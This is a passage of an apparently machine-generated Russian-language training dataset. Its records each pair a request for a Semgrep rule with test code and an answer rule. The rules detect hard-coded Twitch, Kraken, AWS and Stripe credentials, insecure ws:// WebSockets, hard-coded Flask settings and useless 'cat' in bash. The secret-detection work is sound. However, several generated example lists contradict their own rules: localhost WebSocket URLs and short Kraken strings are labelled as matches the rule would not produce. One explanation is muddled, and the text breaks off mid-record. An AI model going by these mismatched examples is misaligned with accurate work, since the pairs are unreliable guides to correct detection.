    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: twitch-api-token.go\n// ruleid: twitch-api-token\ntwitch_api_token = \"sx7sjxjrajg2kr0ecm7xwi0gcnezno\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: twitch-api-token.go\n// ruleid: twitch-api-token\ntwitch_api_token = \"sx7sjxjrajg2kr0ecm7xwi0gcnezno\"\n• // File: another-twitch-go-file.go\n// ruleid: twitch-api-token\ntwitch_access_key = \"abc123xyz456defghijklmnopqrstuvwxyz\"\n• // File: yet-another-twitch-file.go\n// ruleid: twitch-api-token\nconst twitch_secret = \"1234567890abcdef1234567890abcdef\"\n\nБезопасные паттерны:  \n• // File: safe-twitch-go-file.go\ntwitchApiToken := os.Getenv(\"TWITCH_API_TOKEN\")\n• // File: secure-twitch-go-file.go\nvar twitchAccessKey string = getSecureCredentialFromVault()\n• // File: no-twitch-go-file.go\napiKey := \"some-other-key\"\n\nЛегенда аннотаций:\n- // ruleid:twitch-api-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:twitch-api-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: twitch-api-token\n  message: A gitleaks twitch-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:twitch)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{30})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена API Twitch в исходном коде. Регулярное выражение ищет строку, содержащую слово 'twitch' в любом регистре, за которым следуют случайные символы длиной от 30 до 30 символов, представляющие токен API. Правило применяет флаг case insensitive для учета регистра букв.\n\n# Ключевые элементы:\n- ID: twitch-api-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "twitch-api-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения hardcoded-token\nОписание уязвимости: A hard-coded credential was detected. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hardcoded-token.py\nimport boto3\nfrom boto3 import client\n\n# ruleid:hardcoded-token\nclient(\"s3\", aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n\n# ruleid:hardcoded-token\nboto3.sessions.Session(aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n\ns = boto3.sessions\n# ruleid:hardcoded-token\ns.Session(aws_access_key_id=\"AKIAxxxxxxxxxxxxxxxx\")\n\nuhoh_key = \"AKIAxxxxxxxxxxxxxxxx\"\nok_secret = os.environ.get(\"SECRET_ACCESS_KEY\")\n# ruleid:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=uhoh_key,\n    aws_secret_access_key=ok_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\nok_key = os.environ.get(\"ACCESS_KEY_ID\")\n\nuhoh_secret = \"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\"\n# ruleid:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=uhoh_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\nok_secret = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n# ok:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=ok_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\nok_token = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n# ok:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=ok_secret,\n    aws_session_token=ok_token,\n    region_name=\"sfo2\",\n    endpoint_url=\"https://sfo2.digitaloceanspaces.com\",\n)\n\n# ok:hardcoded-token\ns3 = client(\"s3\", aws_access_key_id=\"this-is-not-a-key\")\n\n# ok:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=\"XXXXXXXX\",\n    aws_secret_access_key=\"----------------\",\n    region_name=\"us-east-1\",\n)\n\n# ok:hardcoded-token\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=\"<your token here>\",\n    aws_secret_access_key=\"<your secret here>\",\n    region_name=\"us-east-1\",\n)\n\n# ok:hardcoded-token\nkey = os.environ.get(\"ACCESS_KEY_ID\")  # Ограничиваем длину\n\nОпасные паттерны:\n• client(\"s3\", aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n• boto3.sessions.Session(aws_secret_access_key=\"jWnyxxxxxxxxxxxxxxxxX7ZQxxxxxxxxxxxxxxxx\")\n• s.Session(aws_access_key_id=\"AKIAxxxxxxxxxxxxxxxx\")\n\nБезопасные паттерны:  \n• ok_key = \"AKIAxxxxxxxxxxxxxxxx\"\nok_secret = os.environ.get(\"SECRET_ACCESS_KEY\")\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=ok_secret,\n    region_name=\"sfo2\"\n• ok_secret = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=ok_secret,\n    region_name=\"sfo2\",\n    endpoint_url=\"https:\n• ok_token = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\ns3 = boto3.resource(\n    \"s3\",\n    aws_access_key_id=ok_key,\n    aws_secret_access_key=ok_secret,\n    aws_session_token=ok_token,\n    region_name=\"\n\nЛегенда аннотаций:\n- // ruleid:hardcoded-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hardcoded-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: hardcoded-token\n  message: >-\n    A hard-coded credential was detected. It is not recommended to store credentials in source-code,\n    as this risks secrets\n    being leaked and used by either an internal or external malicious adversary. It is recommended to\n    use environment variables to securely provide credentials or retrieve credentials from a secure\n    vault or HSM (Hardware Security Module).\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n    - https://bento.dev/checks/boto3/hardcoded-access-token/\n    - https://aws.amazon.com/blogs/security/what-to-do-if-you-inadvertently-expose-an-aws-access-key/\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    category: security\n    technology:\n    - boto3\n    - secrets\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [python]\n  severity: WARNING\n  mode: taint\n  pattern-sources:\n  - pattern: |\n      \"...\"\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: $W(...,$TOKEN=\"$VALUE\",...)\n      - pattern: $BOTO. ... .$W(...,$TOKEN=\"$VALUE\",...)\n    - metavariable-regex:\n        metavariable: $TOKEN\n        regex: (aws_session_token|aws_access_key_id|aws_secret_access_key)\n    - metavariable-pattern:\n        language: generic\n        metavariable: $VALUE\n        patterns:\n        - pattern-either:\n          - pattern-regex: ^AKI\n          - pattern-regex: ^[A-Za-z0-9/+=]+$\n    - metavariable-analysis:\n        metavariable: $VALUE\n        analyzer: entropy\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных токенов доступа AWS в Python-коде. Анализ выполняется методом taint. Источниками (sources) являются строковые литералы, содержащие жестко закодированные токены. Синками (sinks) считаются вызовы функций или методов, принимающих токен доступа в качестве аргумента. Правило использует метапеременные ($W, $TOKEN, $VALUE) для захвата токенов и проверяет их значение с помощью регулярных выражений и анализа энтропии.\n\n# Ключевые элементы:\n- ID: hardcoded-token\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hardcoded-token",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: kraken-access-token\nОписание уязвимости: A gitleaks kraken-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: kraken-access-token.go\n// ruleid: kraken-access-token\nkraken_api_token = \"bd=n9nkkq1ommtanic+eej5w+/m2d33psu_txwbsyi=v+1qn/8w1yz+oydvooxuti39c+9s3dpy4vbj1\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: kraken-access-token\nkraken_api_token = \"bd=n9nkkq1ommtanic+eej5w+/m2d33psu_txwbsyi=v+1qn/8w1yz+oydvooxuti39c+9s3dpy4vbj1\"\n• // ruleid: kraken-access-token\nconst krakenAccessToken = 'kraken_access_token=abc123xyz'\n• // ruleid: kraken-access-token\nlet krakenApiKey = 'KRAKEN_API_KEY=1234567890abcdef'\n\nБезопасные паттерны:  \n• // safe: kraken-access-token\nkraken_api_token = os.getenv('KRAKEN_ACCESS_TOKEN')\n• // safe: kraken-access-token\nkraken_access_token = get_kraken_token_from_secure_vault()\n• // safe: kraken-access-token\nvar krakenToken = read_kraken_token_from_hsm()\n\nЛегенда аннотаций:\n- // ruleid:kraken-access-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:kraken-access-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: kraken-access-token\n  message: A gitleaks kraken-access-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:kraken)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9\\/=_\\+\\-]{80,90})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного токена доступа Kraken в исходном коде. Регулярное выражение ищет строку, содержащую слово 'kraken' в любом регистре, за которым следуют произвольные символы длиной от 80 до 90 символов, представляющие собой токен доступа. Правило применяет флаг case insensitive (?i), чтобы учитывать совпадения как в верхнем, так и в нижнем регистрах.\n\n# Ключевые элементы:\n- ID: kraken-access-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "kraken-access-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: useless-cat\nОписание уязвимости: Useless call to 'cat' in a pipeline. Use '<' and '>' for any command to read from a file or write to a file.\nCWE: \nТип анализа: search\nЯзык: bash",
    "input": "Требования:\n- Язык: bash\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: useless-cat.bash\n# ok:useless-cat\na b\n\n# ruleid:useless-cat\ncat | a b\n\n# ruleid:useless-cat\ncat | a b | c d\n\n# ok:useless-cat\ncat file1 file2 | a b\n\n# ok:useless-cat\ncat $files | a b\n\n# ruleid:useless-cat\ncat file | a b\n\n# ruleid:useless-cat\ncat \"$file\" | a b\n\n# ruleid:useless-cat\na b | cat > file\n\n# ruleid:useless-cat\na b | c d | cat > file\n\n# ruleid:useless-cat\na b | cat | c d\n\n# ruleid:useless-cat\na b | c d | cat | e f | g h\n\n# ruleid:useless-cat\nwhile true; do\n  a b\ndone | cat\n\n# ruleid:useless-cat\ncat | while true; do\n  a b\ndone  # Ограничиваем длину\n\nОпасные паттерны:\n• cat | a b\n• cat | a b | c d\n• cat file | a b\n\nБезопасные паттерны:  \n• cat file1 file2 | a b\n• cat $files | a b\n• cat < file\n\nЛегенда аннотаций:\n- // ruleid:useless-cat: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:useless-cat: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: useless-cat\n  pattern-either:\n  - pattern: |\n      cat | ...\n  - patterns:\n    - pattern: |\n        cat $ARG | ...\n    - pattern-not: |\n        cat ${$SEVERAL_FILES} | ...\n  - pattern: |\n      ... | cat\n  - pattern: |\n      ... | cat | ...\n  # TODO: autofix, once we support $...ARGS\n  message: >-\n    Useless call to 'cat' in a pipeline. Use '<' and '>' for any command\n    to read from a file or write to a file.\n  metadata:\n    references:\n    - https://github.com/koalaman/shellcheck/wiki/SC2002\n    category: best-practice\n    technology:\n    - bash\n  severity: WARNING\n  languages:\n  - bash\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска бесполезных вызовов команды 'cat' внутри конвейеров в языке bash. Оно ищет случаи, когда 'cat' используется только для перенаправления ввода или вывода, вместо использования стандартных операторов перенаправления '<', '>'. Правило использует комбинацию шаблонов для охвата различных сценариев использования 'cat' в конвейере. Первый шаблон ищет прямое использование 'cat' с последующим конвейером. Второй шаблон охватывает случаи, когда 'cat' вызывается с аргументом переменной ($ARG), за которым следует конвейер. Третий шаблон проверяет наличие 'cat' после конвейера. Четвертый шаблон обнаруживает последовательное использование 'cat' в нескольких конвейерах.\n\n# Ключевые элементы:\n- ID: useless-cat\n- Язык: bash \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "useless-cat",
      "language": "bash",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: detect-insecure-websocket\nОписание уязвимости: Insecure WebSocket Detected. WebSocket Secure (wss) should be used for all WebSocket connections.\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detect-insecure-websocket.js\n// ruleid: detect-insecure-websocket\nvar scheme   = \"ws://\";\nvar uri      = scheme + window.document.location.host + \"/\";\nvar ws       = new WebSocket(uri);\nws.onmessage = function(message) {}\n\n\n// at start of the line\n// ruleid: detect-insecure-websocket\nws://foo/bar\n\n// ok: detect-insecure-websocket\nvar secure_url = \"wss://my/url\";\n\n// ok: detect-insecure-websocket\nvar amazon_url = \"aws://my/url\";\n\n// from https://github.com/ytdl-org/youtube-dl/blob/master/youtube_dl/extractor/yahoo.py#L124\n// ok: detect-insecure-websocket\n// # ytwnews://cavideo/\n\n// ok: detect-insecure-websocket\nvar localhost = \"ws://localhost:27017/freecodecamp?directConnection=true\";\n\n// ok: detect-insecure-websocket\nvar local = \"ws://127.0.0.1:3000\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: detect-insecure-websocket\nvar scheme = \"ws://\";\n• // ruleid: detect-insecure-websocket\nw://foo/bar\n• // ruleid: detect-insecure-websocket\nws://localhost:8080\n\nБезопасные паттерны:  \n• // ok: detect-insecure-websocket\nvar secure_url = \"wss://my/url\";\n• // ok: detect-insecure-websocket\nvar amazon_url = \"aws://my/url\";\n• var localhost = \"ws://localhost:27017/freecodecamp?directConnection=true\";\n\nЛегенда аннотаций:\n- // ruleid:detect-insecure-websocket: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detect-insecure-websocket: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detect-insecure-websocket\n  message: Insecure WebSocket Detected. WebSocket Secure (wss) should be used for all WebSocket connections.\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    asvs:\n      section: 'V13: API and Web Service Verification Requirements'\n      control_id: 13.5.1 Insecure WebSocket\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x21-V13-API.md#v135-websocket-security-requirements\n      version: '4'\n    category: security\n    technology:\n    - regex\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n  languages:\n  - regex\n  severity: ERROR\n  patterns:\n  - pattern-regex: \\bws:\\/\\/\n  - pattern-not-inside: \\bws:\\/\\/localhost.*\n  - pattern-not-inside: \\bws:\\/\\/127.0.0.1.*\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска строк, начинающихся с 'ws://', за которыми не следуют исключения, такие как подключения к локальному хосту или адресу IPv4. Паттерн ищет небезопасные WebSocket соединения, используя незашифрованный протокол 'ws://' вместо безопасного 'wss://'. Безопасные примеры исключены с помощью операторов pattern-not-inside.\n\n# Ключевые элементы:\n- ID: detect-insecure-websocket\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detect-insecure-websocket",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: avoid_hardcoded_config_TESTING\nОписание уязвимости: Hardcoded variable `TESTING` detected. Use environment variables or config files instead\nCWE: CWE-489: Active Debug Code\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-489: Active Debug Code\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hardcoded-config.py\nimport os\nimport flask\napp = flask.Flask(__name__)\n\n# ruleid: avoid_hardcoded_config_TESTING\napp.config[\"TESTING\"] = True\n# ruleid: avoid_hardcoded_config_TESTING\napp.config[\"TESTING\"] = False\n# ruleid: avoid_hardcoded_config_TESTING\napp.config.update(TESTING=True)\n\n# ruleid: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=\"aaaa\")\n# ruleid: avoid_hardcoded_config_SECRET_KEY\napp.config[\"SECRET_KEY\"] = '_5#y2L\"F4Q8z\\n\\xec]/'\n\n# ruleid: avoid_hardcoded_config_ENV\napp.config[\"ENV\"] = \"development\"\n# ruleid: avoid_hardcoded_config_ENV\napp.config[\"ENV\"] = \"production\"\n\n# ruleid: avoid_hardcoded_config_DEBUG\napp.config[\"DEBUG\"] = True\n# ruleid: avoid_hardcoded_config_DEBUG\napp.config[\"DEBUG\"] = False\n\n# ok: avoid_hardcoded_config_TESTING\napp.config[\"TESTING\"] = os.getenv(\"TESTING\")\n# ok: avoid_hardcoded_config_TESTING\napp.config[\"TESTING\"] = \"aa\"\n\n# ok: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=os.getenv(\"SECRET_KEY\"))\n# ok: avoid_hardcoded_config_SECRET_KEY\napp.config.update(SECRET_KEY=os.environ[\"SECRET_KEY\"])\n\n# ok: avoid_hardcoded_config_ENV\napp.config[\"ENV\"] = os.environ[\"development\"]\n\n# ok: avoid_hardcoded_config_DEBUG\napp.config[\"DEBUG\"] = os.environ[\"DEBUG\"] or True\n# ok: avoid_hardcoded_config_DEBUG\napp.config[\"DEBUG\"] = os.environ[\"DEBUG\"] or False  # Ограничиваем длину\n\nОпасные паттерны:\n• app.config['TESTING'] = True\n• app.config['SECRET_KEY'] = '_5#y2L\"F4Q8z\\n\\xec]/'\n• app.config['ENV'] = \"development\"\n\nБезопасные паттерны:  \n• app.config['TESTING'] = os.getenv('TESTING')\n• app.config.update(SECRET_KEY=os.getenv('SECRET_KEY'))\n• app.config['ENV'] = os.environ['development']\n\nЛегенда аннотаций:\n- // ruleid:avoid_hardcoded_config_TESTING: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid_hardcoded_config_TESTING: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: avoid_hardcoded_config_TESTING\n  message: Hardcoded variable `TESTING` detected. Use environment variables or config files instead\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    category: security\n    cwe:\n    - 'CWE-489: Active Debug Code'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://bento.dev/checks/flask/avoid-hardcoded-config/\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features\n    subcategory:\n    - audit\n    technology:\n    - flask\n  languages: [python]\n  pattern-either:\n  - pattern: $M.config['TESTING'] = True\n  - pattern: $M.config['TESTING'] = False\n  - pattern: $M.update(TESTING=True, ...)\n  - pattern: $M.update(TESTING=False, ...)\n- id: avoid_hardcoded_config_SECRET_KEY\n  message: Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead\n  severity: ERROR\n  metadata:\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    category: security\n    cwe:\n    - 'CWE-489: Active Debug Code'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://bento.dev/checks/flask/avoid-hardcoded-config/\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features\n    subcategory:\n    - audit\n    technology:\n    - flask\n  languages: [python]\n  pattern-either:\n  - pattern: $M.update(SECRET_KEY=\"=~/.*/\")\n  - pattern: $M.config['SECRET_KEY'] = \"=~/.*/\"\n- id: avoid_hardcoded_config_ENV\n  message: Hardcoded variable `ENV` detected. Set this by using FLASK_ENV environment variable\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    category: security\n    cwe:\n    - 'CWE-489: Active Debug Code'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://bento.dev/checks/flask/avoid-hardcoded-config/\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features\n    subcategory:\n    - audit\n    technology:\n    - flask\n  languages: [python]\n  pattern-either:\n  - pattern: $M.update(ENV=\"=~/^development|production$/\")\n  - pattern: $M.config['ENV'] = \"=~/^development|production$/\"\n- id: avoid_hardcoded_config_DEBUG\n  message: Hardcoded variable `DEBUG` detected. Set this by using FLASK_DEBUG environment variable\n  severity: WARNING\n  metadata:\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n    category: security\n    cwe:\n    - 'CWE-489: Active Debug Code'\n    owasp:\n    - A05:2021 - Security Misconfiguration\n    references:\n    - https://bento.dev/checks/flask/avoid-hardcoded-config/\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#builtin-configuration-values\n    - https://flask.palletsprojects.com/en/1.1.x/config/?highlight=configuration#environment-and-debug-features\n    subcategory:\n    - audit\n    technology:\n    - flask\n  languages: [python]\n  pattern-either:\n  - pattern: $M.update(DEBUG=True)\n  - pattern: $M.update(DEBUG=False)\n  - pattern: $M.config['DEBUG'] = True\n  - pattern: $M.config['DEBUG'] = False\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жестко закодированных переменных конфигурации (`TESTING`, `SECRET_KEY`, `ENV`, `DEBUG`) непосредственно в коде приложения Flask. Правило использует оператор pattern-either для проверки нескольких шаблонов, которые могут встречаться в коде. Опасный код включает прямое присвоение значений этим переменным, тогда как безопасный код использует окружающие переменные или файлы конфигурации.\n\n# Ключевые элементы:\n- ID: avoid_hardcoded_config_TESTING\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "avoid_hardcoded_config_TESTING",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения detected-stripe-restricted-api-key\nОписание уязвимости: Stripe Restricted API Key detected\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: detected-stripe-restricted-api-key.txt\n# ruleid: detected-stripe-restricted-api-key\nrk_live_xf2fh0Hu3LqXlqqUg2DEWhEz\n\n# ok: detected-stripe-restricted-api-key\nrk_live_  # Ограничиваем длину\n\nОпасные паттерны:\n• rk_live_xf2fh0Hu3LqXlqqUg2DEWhEz\n• const apiKey = 'rk_live_zx123abc456defghijklmnopqrst';\n\nБезопасные паттерны:  \n• rk_live_\n• let apiKey = 'rk_test_abc123def456ghi789jkl0mnpqrstuvwxyz';\n\nЛегенда аннотаций:\n- // ruleid:detected-stripe-restricted-api-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:detected-stripe-restricted-api-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: detected-stripe-restricted-api-key\n  pattern-regex: rk_live_[0-9a-zA-Z]{24}\n  languages: [regex]\n  message: Stripe Restricted API Key detected\n  severity: ERROR\n  metadata:\n    cwe:\n    - 'CWE-798: Use of Hard-coded Credentials'\n    source-rule-url: https://github.com/dxa4481/truffleHogRegexes/blob/master/truffleHogRegexes/regexes.json\n    category: security\n    technology:\n    - secrets\n    - stripe\n    confidence: MEDIUM\n    owasp:\n    - A07:2021 - Identification and Authentication Failures\n    references:\n    - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило использует регулярное выражение для поиска жестко закодированных Stripe Restricted API ключей. Паттерн ищет строку, начинающуюся с 'rk_live_' за которой следует ровно 24 символа, состоящих из букв и цифр. Это соответствует формату идентификаторов Stripe API. Правило применимо только к текстовым данным, представленным в виде регулярного выражения.\n\n# Ключевые элементы:\n- ID: detected-stripe-restricted-api-key\n- Язык: regex \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "detected-stripe-restricted-api-key",
      "language": "regex",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Разработай правило Semgrep для выявления: azure-postgresql-server-log-checkpoint-enabled\nОписание уязвимости: Ensure server parameter log_checkpoints is set to ON for PostgreSQL Database Server\nCWE: \nТип анализа: search\nЯзык: hcl",
